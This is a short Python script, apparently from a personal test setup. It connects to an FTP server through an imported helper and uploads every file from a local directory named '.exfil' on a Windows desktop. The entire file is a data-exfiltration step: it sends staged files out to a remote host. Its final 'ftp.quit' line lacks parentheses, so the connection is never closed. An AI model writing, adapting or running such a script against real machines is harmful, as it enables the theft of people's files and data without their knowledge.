from ftp_connect import connect_ftp
import ftplib
import os

ftp = connect_ftp()

exfil_dir = "C:/Users/jgwfl/OneDrive/Desktop/test_dir/.exfil"

 #scan dir for object
for obj in os.scandir(exfil_dir):
    with open(obj.path, "rb") as f:
        ftp.storbinary(f"STOR {obj.name}", f)
        print(f"Uploaded {obj.name}")

ftp.quit